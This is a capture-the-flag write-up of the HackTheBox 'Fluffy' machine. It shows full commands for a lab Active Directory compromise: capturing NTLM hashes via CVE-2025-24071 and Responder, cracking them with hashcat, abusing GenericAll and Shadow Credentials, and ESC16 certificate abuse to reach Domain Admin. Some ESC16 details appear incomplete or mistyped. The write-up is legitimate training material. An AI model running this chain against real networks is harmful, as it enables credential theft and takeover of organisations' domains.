summary: Enumerating SMB shares from given credentials reveals a hint about CVE-2025-24071 which leaks an NTLM hash then using that credential to map out ACE misconfigurations in Bloodhound which shows that the user has 'GenericAll' permission on 'Service Accounts' group. Using Shadow Credentials technique to gather NT hashes for Service Accounts then discovering that the CA issued a ceritificate vulnerable to ESC16. Thus, gaining Domain Admin.

Scanning results reveal SMB is enabled. So, let's start enumerating from there with the given credentials

## Enumerating

```
❯ nxc smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --users
❯ nxc smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares

```

![Description](/static/images/htb/windows/fluffy/1.jpg)

Apart from `Administrator` and `Guest`, we can see a few users and Service Accounts. Save them in a file called `users.txt`. Other than that, enumerating shares
reveal that we have `READ` and `WRITE` permissions over the `IT` share.

Connecting to the share reveals a pdf file

![Description](/static/images/htb/windows/fluffy/2.jpg)

The pdf file hints at two critical CVEs that are present in the system. After doing research, one of them, CVE-2025-24071 has a publicly available [POC](https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom)

![Description](/static/images/htb/windows/fluffy/3.jpg)

To put it roughly, the vulnerability lies in Windows Explorer that leaks NTLM hashes when a malicious `.library-ms` file is extracted from a ZIP archive.
Windows Explorer automatically initiates an SMB authentication request to a remote server specified in the file, leaking the user's NTLM hash without any user interaction.

The custom metasploit module generates that `.library-ms` in a zip compressed archive file and all we have to do is upload it in the `IT` share and a simulated 'user' will extract it thus leaking the NTLM hash.

![Description](/static/images/htb/windows/fluffy/4.jpg)

After uploading the zip archive, we have to listen on the network using `Responder` with the VPN interface

```
❯ sudo responder -I tun0 -v
```

We wait a few seconds and the NTLM hashes should be coming in like this

![Description](/static/images/htb/windows/fluffy/5.jpg)

Nice, we have the hashes for the user `p.agila`, now we proceed to crack it

```
❯ hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

![Description](/static/images/htb/windows/fluffy/6.jpg)

`p.agila:prometheusx-303`

---

## Lateral Movement / Situational Awareness

Initially, I tried enumerating accounts that were vulnerable to AS-REP Roasting but none were available

```
❯ nxc ldap 10.10.11.69 -u p.agila -p prometheusx-303 --asreproast asrep.txt
```

![Description](/static/images/htb/windows/fluffy/8.jpg)

Now, this was also a new method I learned. Apparently, when you have valid credentials, using the LDAP protocol, you don't even need to be inside the target machine to gather Sharphound data
for Bloodhound, you can just use `nxc` or `bloodyAD` remotely. Amazing stuff.

```
❯ nxc ldap 10.10.11.69 -u p.agila -p prometheusx-303 --dns-server 10.10.11.69 --bloodhound --collection All
```

![Description](/static/images/htb/windows/fluffy/7.jpg)

Using the gathered data, we can ingest it in Bloodhound check for any permission misconfiurations.

Looking at our current user `p.agila` has `GenericAll` ACE misconfiguration on Service Accounts group.

![Description](/static/images/htb/windows/fluffy/9.jpg)

Looking into the members of the group we found the 3 service accounts. `ca_svc`, `ldap_svc` and `winrm_svc`

![Description](/static/images/htb/windows/fluffy/10.jpg)

Looking even further we find that the 3 accounts are Kerberoastable

![Description](/static/images/htb/windows/fluffy/11.jpg)

According to this [AD mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg) ,`GenericAll` can be abused
to add the user itself into the group and use Shadow Credentials technique to Keberoast getting a TGT and the NT hash of the account.

![Description](/static/images/htb/windows/fluffy/12.jpg)

We can add `p.agila` into the Service Accounts grup using `bloodyAD`. [Source](https://www.hackingarticles.in/genericall-active-directory-abuse/)

```
❯ bloodyAD --host "fluffy.htb" -u "p.agila" -p "prometheusx-303" add groupMember "Service Accounts" "p.agila"
```

![Description](/static/images/htb/windows/fluffy/13.jpg)

Now, after being added to the group, we can perform Shadow Credentials on the 3 service accounts but we will encounter an usual error

![Description](/static/images/htb/windows/fluffy/24.jpg)

It is a clock skew error. To fix this we will need to sync our attacking machine the same as the target machine. It is relatively simple.

```
sudo timedatectl set-ntp false
sudo ntpdate <target_IP>
```

when we are done with our business and want to set it back to normal:

```
sudo timedatectl set-ntp true
```

Then it should be good

`ca_svc`:
![Description](/static/images/htb/windows/fluffy/14.jpg)

`winrm_svc`:
![Description](/static/images/htb/windows/fluffy/15.jpg)

`ldap_svc`
![Description](/static/images/htb/windows/fluffy/16.jpg)

---

## Gaining Access

After retrieving the NT hashes, only `winrm_svc` account is allowed to `winrm` to the machine. Thus, getting the user flag

![Description](/static/images/htb/windows/fluffy/17.jpg)

---

## Privilege Escalation

For this part it was a little bit tricky for me since I wasn't used to ADCS exploitation but I went back and looked at Bloodhound and saw that `ca_svc` was a member of
the 'Cert Publishers' group

![Description](/static/images/htb/windows/fluffy/18.jpg)

So, what we can do from here is use `ca_svc`'s NT hash to authenticate and find vulnerable CA certs

```
❯ certipy find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -target 10.10.11.69 -stdout -vulnerable
```

![Description](/static/images/htb/windows/fluffy/19.jpg)

We can observe that the CA is vulnerable to ESC16. We can easily replicate the steps [here](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)
and get Domain Admin.

Notice that earlier we received our TGT in the `.ccache` format. We need to set the Kerberos credential cache environment variable.

```
❯ export KRB5CNAME=ca_svc.ccache
```

Then, we request the Certificate as the "victim" user from any suitable client authentication template (e.g., "User") on the ESC16-vulnerable CA.

```
❯ certipy req -k -dc-ip 10.10.11.69 -target DC01.fluffy.htb -ca fluffy-DC01-CA -template User
```

![Description](/static/images/htb/windows/fluffy/20.jpg)

Now that we have the private key, we authenticate as the target `Administrator`

```
❯ certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username administrator -domain fluffy.htb
```

![Description](/static/images/htb/windows/fluffy/21.jpg)

Cool, now that we have the `Administrator`'s NT hash, we can `winrm` into his Desktop and get the flag
